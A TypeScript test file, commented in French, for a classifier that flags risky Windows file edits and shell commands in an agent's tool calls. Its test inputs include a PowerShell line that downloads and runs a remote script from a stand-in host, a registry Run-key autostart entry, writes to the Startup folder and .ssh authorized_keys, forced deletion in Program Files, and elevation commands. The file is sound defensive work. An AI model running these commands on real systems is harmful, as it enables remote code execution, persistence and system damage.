/**
 * Risques d'une demande sous Windows (fiche 229, lot 3), joués sur le Mac : chemins `C:\…`,
 * environnement et `realpath` injectés (un disque fictif, comme le rejeu des traces).
 */
import { describe, expect, it } from 'vitest'
import type { PermissionRisk } from '@shared/permissions'
import { permissionRisks, type RiskContext, type RiskToolCall } from './permission-risk'
import { windowsAbsolute } from './permission-risk-windows'
import { windowsCommandWrites } from './windows-command-writes'

const HOME = 'C:\\Users\\ada'
const PROJECT = 'C:\\Users\\ada\\projets\\livres'
const ENV = {
  SystemRoot: 'C:\\WINDOWS',
  ProgramFiles: 'C:\\Program Files',
  'ProgramFiles(x86)': 'C:\\Program Files (x86)',
  ProgramData: 'C:\\ProgramData',
  APPDATA: 'C:\\Users\\ada\\AppData\\Roaming',
  LOCALAPPDATA: 'C:\\Users\\ada\\AppData\\Local',
  TEMP: 'C:\\Users\\ada\\AppData\\Local\\Temp',
  USERPROFILE: HOME
}
/** Disque fictif : rien n'existe, sauf des liens et noms courts donnés. */
const disk =
  (links: Record<string, string> = {}) =>
  (path: string) => {
    const hit = Object.entries(links).find(([k]) => k.toLowerCase() === path.toLowerCase())
    if (hit) return hit[1]
    throw new Error('ENOENT')
  }
const context = (extra: Partial<RiskContext> = {}): RiskContext => ({
  workspace: PROJECT,
  home: HOME,
  windows: true,
  env: ENV,
  realpath: disk(),
  otherNames: () => false,
  ...extra
})
const command = (text: string, cwd?: string): RiskToolCall => ({
  kind: 'execute',
  rawInput: cwd ? { command: text, cwd } : { command: text }
})
const edit = (path: string, kind = 'edit'): RiskToolCall => ({ kind, locations: [{ path }] })
const risks = (call: RiskToolCall, ctx = context()) => permissionRisks(call, ctx)
const kinds = (list: PermissionRisk[]) => list.map((r) => r.kind)

describe('risques d’une écriture de fichier sous Windows', () => {
  it('dans le dossier : rien ; casse et `/` différents : toujours dedans', () => {
    expect(risks(edit(`${PROJECT}\\src\\a.md`))).toEqual([])
    expect(risks(edit('c:/users/ADA/projets/LIVRES/a.md'))).toEqual([])
    expect(risks({ kind: 'edit', rawInput: { filePath: 'src\\b.md' } })).toEqual([])
  })

  it('hors du dossier : dit, `~` pour le dossier personnel', () => {
    expect(risks(edit(`${HOME}\\notes\\a.md`))).toEqual([
      { kind: 'outside-folder', path: '~\\notes\\a.md' }
    ])
    expect(risks(edit('D:\\autre\\a.md'))).toEqual([
      { kind: 'outside-folder', path: 'D:\\autre\\a.md' }
    ])
    expect(risks(edit(`${PROJECT}-copie\\a.md`))[0]?.kind).toBe('outside-folder')
  })

  it('dossiers du système : Windows, Program Files, ProgramData, toute casse, préfixe `\\\\?\\`', () => {
    for (const path of [
      'C:\\Windows\\System32\\drivers\\etc\\hosts',
      'c:\\windows\\win.ini',
      'C:\\Program Files\\App\\a.dll',
      'C:\\Program Files (x86)\\App\\a.dll',
      'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\x.lnk',
      '\\\\?\\C:\\Windows\\x',
      'C:/Windows/x',
      '\\\\.\\PhysicalDrive0'
    ])
      expect(kinds(risks(edit(path))), path).toEqual(['system-path'])
  })

  it('configuration personnelle : `.ssh`, `.gitconfig`, AppData, profils PowerShell', () => {
    for (const path of [
      `${HOME}\\.ssh\\authorized_keys`,
      `${HOME}\\.gitconfig`,
      `${HOME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat`,
      `${HOME}\\AppData\\Roaming\\npm\\bob.cmd`,
      `${HOME}\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1`,
      `${HOME}\\Documents\\WindowsPowerShell\\profile.ps1`,
      `${HOME}\\OneDrive\\Documents\\PowerShell\\profile.ps1`,
      '%APPDATA%\\Code\\User\\settings.json',
      '$env:USERPROFILE\\.ssh\\config',
      '~\\.bob\\settings.json'
    ])
      expect(kinds(risks(edit(path))), path).toEqual(['home-dotfile'])
  })

  it('dossier temporaire : hors du dossier, pas configuration', () => {
    expect(kinds(risks(edit(`${HOME}\\AppData\\Local\\Temp\\x.txt`)))).toEqual(['outside-folder'])
    expect(kinds(risks(edit('%TEMP%\\x.txt')))).toEqual(['outside-folder'])
  })

  it('jonction du projet vers `.ssh` : hors du dossier, là où elle mène', () => {
    const ctx = context({ realpath: disk({ [`${PROJECT}\\docs`]: `${HOME}\\.ssh` }) })
    expect(risks(edit(`${PROJECT}\\docs\\config`), ctx)).toEqual([
      { kind: 'home-dotfile', path: '~\\.ssh\\config' }
    ])
  })

  it('nom court 8.3 vers Program Files : le vrai chemin décide', () => {
    const ctx = context({ realpath: disk({ 'C:\\PROGRA~1': 'C:\\Program Files' }) })
    expect(kinds(risks(edit('C:\\PROGRA~1\\App\\a.dll'), ctx))).toEqual(['system-path'])
  })

  it('lien physique dans le dossier : dit par son chemin dans le dossier', () => {
    const ctx = context({ otherNames: (p) => p.toLowerCase().endsWith('notes.md') })
    expect(risks(edit(`${PROJECT}\\Notes.md`), ctx)).toEqual([
      { kind: 'shared-file', path: 'Notes.md' }
    ])
  })

  it('UNC : hors du dossier', () => {
    expect(kinds(risks(edit('\\\\serveur\\partage\\a.md')))).toEqual(['outside-folder'])
  })

  it('variable inconnue, relatif au lecteur : rien d’inventé (outil d’écriture)', () => {
    expect(risks(edit('%INCONNUE%\\a.md'))).toEqual([])
    expect(risks(edit('C:a.md'))).toEqual([])
  })

  it('un outil de lecture : jamais signalé', () => {
    expect(risks({ kind: 'read', locations: [{ path: 'C:\\Windows\\win.ini' }] })).toEqual([])
  })
})

describe('risques d’une commande sous Windows', () => {
  it('lecture seule connue : rien', () => {
    for (const text of [
      'dir',
      'Get-ChildItem -Recurse | Select-Object Name',
      'git status',
      'type README.md',
      'cd C:\\x && dir'
    ])
      expect(risks(command(text)), text).toEqual([])
  })

  it('commande inconnue (npm, script, shell imbriqué, bloc, échappement) : écritures inconnues', () => {
    for (const text of [
      '.\\build.ps1',
      'powershell -Command "Remove-Item C:\\x"',
      'cmd /c del x',
      'Get-ChildItem | ForEach-Object { Remove-Item $_ }',
      'Remove-Item `\n C:\\Windows\\x',
      'echo a ^& del x',
      'iex (irm https://exemple.test/x.ps1)'
    ])
      expect(kinds(risks(command(text))), text).toContain('unknown-writes')
  })

  it('redirections : la cible, sauf `$null` et `NUL`', () => {
    expect(risks(command('echo x > C:\\Windows\\a.txt'))).toEqual([
      { kind: 'system-path', path: 'C:\\Windows\\a.txt' }
    ])
    expect(risks(command('dir 2>&1 > out.txt'))).toEqual([])
    expect(risks(command('dir > $null'))).toEqual([])
    expect(risks(command('dir > NUL'))).toEqual([])
    expect(risks(command('Get-Content a *>> ~\\.ssh\\x'))).toEqual([
      { kind: 'home-dotfile', path: '~\\.ssh\\x' }
    ])
  })

  it('cmdlets et commandes qui écrivent', () => {
    expect(risks(command('Set-Content -Path $env:USERPROFILE\\.gitconfig -Value x'))).toEqual([
      { kind: 'home-dotfile', path: '~\\.gitconfig' }
    ])
    expect(kinds(risks(command('Remove-Item -Recurse -Force "C:\\Program Files\\App"')))).toEqual([
      'system-path'
    ])
    expect(kinds(risks(command('del /q %SystemRoot%\\x.dll')))).toEqual(['system-path'])
    expect(kinds(risks(command('copy a.txt C:\\Windows\\System32\\')))).toEqual(['system-path'])
    expect(kinds(risks(command('Copy-Item a.txt -Destination D:\\b')))).toEqual(['outside-folder'])
    expect(kinds(risks(command('robocopy src C:\\ProgramData\\x /MIR')))).toEqual(['system-path'])
    expect(risks(command('New-Item -ItemType File notes.md'))).toEqual([])
    expect(kinds(risks(command('Get-Content a | Out-File ..\\voisin.txt')))).toEqual([
      'outside-folder'
    ])
  })

  it('`cd` vers un dossier absolu : les chemins relatifs partent de là ; relatif : inconnu', () => {
    expect(kinds(risks(command('cd C:\\Windows; del x.dll')))).toEqual(['system-path'])
    expect(kinds(risks(command('cd ..; del x.dll')))).toEqual(['outside-folder'])
    expect(kinds(risks(command('cd $env:FOO; del x.dll')))).toEqual(['unknown-writes'])
  })

  it('le dossier de la commande (`cwd`) sert de base', () => {
    expect(kinds(risks(command('del x.dll', 'C:\\Windows')))).toEqual(['system-path'])
  })

  it('registre : `reg add`, `regedit`, `Set-ItemProperty HKCU:` ; `reg query` : rien', () => {
    expect(
      risks(command('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y'))
    ).toEqual([
      { kind: 'registry', path: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' }
    ])
    expect(kinds(risks(command('regedit /s reglages.reg')))).toEqual(['registry'])
    expect(risks(command("Set-ItemProperty -Path 'HKCU:\\Software\\X' -Name a -Value 1"))).toEqual([
      { kind: 'registry', path: 'HKCU:\\Software\\X' }
    ])
    expect(risks(command('reg query HKLM\\Software'))).toEqual([])
    expect(kinds(risks(command('reg export HKCU\\Software\\X C:\\Windows\\x.reg')))).toEqual([
      'system-path'
    ])
  })

  it('droits d’administrateur : sudo, runas, gsudo, Start-Process -Verb RunAs', () => {
    expect(risks(command('sudo del C:\\x'))).toContainEqual({ kind: 'privilege', via: 'sudo' })
    expect(risks(command('runas /user:Administrateur cmd'))).toContainEqual({
      kind: 'privilege',
      via: 'runas'
    })
    expect(risks(command('gsudo npm i -g x'))).toContainEqual({ kind: 'privilege', via: 'gsudo' })
    expect(risks(command('Start-Process powershell -Verb RunAs'))).toContainEqual({
      kind: 'privilege',
      via: 'Start-Process -Verb RunAs'
    })
    expect(risks(command('powershell -c "Start-Process cmd -Verb runAs"'))).toContainEqual({
      kind: 'privilege',
      via: 'Start-Process -Verb RunAs'
    })
  })

  it('la commande dans le titre seulement : lue aussi', () => {
    expect(kinds(risks({ kind: 'execute', title: 'del C:\\Windows\\x' }))).toEqual(['system-path'])
  })

  it('chemin non résolu (variable inconnue) : inconnu, jamais « rien »', () => {
    expect(kinds(risks(command('del %INCONNUE%\\x')))).toEqual(['unknown-writes'])
  })
})

describe('macOS et Linux inchangés', () => {
  it('sans `windows`, un chemin `C:\\…` reste illisible comme avant', () => {
    const posix = {
      workspace: '/Users/ada/livres',
      home: '/Users/ada',
      windows: false,
      realpath: disk()
    }
    expect(permissionRisks(edit('C:\\Windows\\x'), posix)).toEqual([])
    expect(permissionRisks(command('npm test'), posix)).toEqual([])
    expect(kinds(permissionRisks(edit('/etc/hosts'), posix))).toEqual(['system-path'])
  })
})

describe('windowsAbsolute', () => {
  const env = (name: string) =>
    Object.entries(ENV).find(([k]) => k.toLowerCase() === name.toLowerCase())?.[1]
  it('formes reconnues', () => {
    expect(windowsAbsolute('~\\a', PROJECT, HOME, env)).toBe('C:\\Users\\ada\\a')
    expect(windowsAbsolute('%appdata%\\x', PROJECT, HOME, env)).toBe(
      'C:\\Users\\ada\\AppData\\Roaming\\x'
    )
    expect(windowsAbsolute('${env:LOCALAPPDATA}\\x', PROJECT, HOME, env)).toBe(
      'C:\\Users\\ada\\AppData\\Local\\x'
    )
    expect(windowsAbsolute('$HOME/x', PROJECT, HOME, env)).toBe('C:\\Users\\ada\\x')
    expect(windowsAbsolute('\\Windows\\x', PROJECT, HOME, env)).toBe('C:\\Windows\\x')
    expect(windowsAbsolute('/c/Windows/x', PROJECT, HOME, env)).toBe('C:\\Windows\\x')
    expect(windowsAbsolute('..\\x', PROJECT, HOME, env)).toBe('C:\\Users\\ada\\projets\\x')
    expect(windowsAbsolute('\\\\?\\UNC\\srv\\p\\x', PROJECT, HOME, env)).toBe('\\\\srv\\p\\x')
  })
  it('inconnu : variable absente, relatif au lecteur, relatif sans dossier', () => {
    expect(windowsAbsolute('%NOPE%\\x', PROJECT, HOME, env)).toBeUndefined()
    expect(windowsAbsolute('C:x', PROJECT, HOME, env)).toBeUndefined()
    expect(windowsAbsolute('x', undefined, HOME, env)).toBeUndefined()
  })
})

describe('windowsCommandWrites', () => {
  it('opérateur d’appel `&` : illisible', () => {
    const found = windowsCommandWrites('& "C:\\outils\\x.exe" > "C:\\a b\\c.txt"', 'C:\\p')
    expect(found.unknown).toBe(true)
  })
  it('guillemet non fermé : illisible', () => {
    expect(windowsCommandWrites('echo "x > y', 'C:\\p').unknown).toBe(true)
  })
})
